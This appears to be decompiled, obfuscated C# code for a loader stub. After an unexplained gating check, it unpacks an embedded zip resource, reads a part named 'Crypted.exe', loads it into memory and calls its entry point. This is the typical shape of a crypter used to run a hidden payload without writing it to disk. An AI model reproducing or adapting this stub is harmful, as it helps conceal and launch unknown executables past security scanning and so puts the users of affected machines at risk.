using System;
using System.IO;
using System.IO.Packaging;
using System.Reflection;
using System.Windows.Forms;

namespace ns0;

internal static class Class0
{
	private static Assembly smethod_0(Package package_0, string string_0)
	{
		Uri uri = new Uri(string_0, UriKind.Relative);
		byte[] array;
		using (Stream stream = package_0.GetPart(uri).GetStream())
		{
			array = new byte[(int)stream.Length];
			stream.Read(array, 0, array.Length);
		}
		Assembly assembly = Assembly.Load(array);
		if (null == assembly)
		{
			throw new ArgumentException("Unable to load assembly: " + string_0);
		}
		return assembly;
	}

	[STAThread]
	private static void Main(string[] args)
	{
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		if (!Class30.smethod_3())
		{
			return;
		}
		try
		{
			using Stream stream = typeof(Class0).Assembly.GetManifestResourceStream("a.zip");
			Package val = Package.Open(stream, FileMode.Open, FileAccess.Read);
			try
			{
				Assembly assembly = smethod_0(val, "/Crypted.exe");
				assembly.EntryPoint!.Invoke(null, new object[1] { args });
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.GetType().Name + Environment.NewLine + ex.Message + Environment.NewLine + ex.StackTrace);
		}
	}
}
